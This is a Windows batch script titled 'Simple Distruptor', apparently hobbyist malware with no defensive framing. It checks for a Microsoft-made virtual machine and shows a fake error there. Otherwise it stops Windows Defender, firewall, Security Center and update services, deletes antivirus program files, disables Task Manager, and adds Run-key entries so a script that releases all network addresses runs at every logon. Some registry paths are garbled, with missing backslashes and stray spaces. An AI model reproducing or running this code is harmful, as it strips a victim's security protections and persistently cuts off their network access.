title Simple Distruptor

FOR /F "tokens=* USEBACKQ" %%F IN (`PowerShell.exe -command " (gwmi Win32_BaseBoard).Manufacturer -eq 'Microsoft Corporation' "`) DO (
SET check=%%F
)
echo %check%

if %check% == False (
    echo Dim WshShell, BtnCode>C:\Windows\ifvm.vbs
    echo Set WshShell = WScript.CreateObject("WScript.Shell")>>C:\Windows\ifvm.vbs
    echo BtnCode = WshShell.Popup("Could not start process!",2+48,"Taskmanager")>>C:\Windows\ifvm.vbs
    echo Select Case BtnCode>>C:\Windows\ifvm.vbs
    echo case 3 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo case 4 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo case 5 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
    echo End Select>>C:\Windows\ifvm.vbs
    start C:\Windows\ifvm.vbs
    pause
    exit
    
    
    
    
    

net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
netsh firewall set opmode mode-disable
net stop "wuauserv"
net stop "Windows Defender Service"
net stop "Windows Firewall"
net stop sharedaccess

del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.dat
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f


echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo Loading...
echo Tanks you for your coroperation!
echo YOu may now close this by pressing enter...
PAUSE
@echo off
cls

COLOR 0F

pause
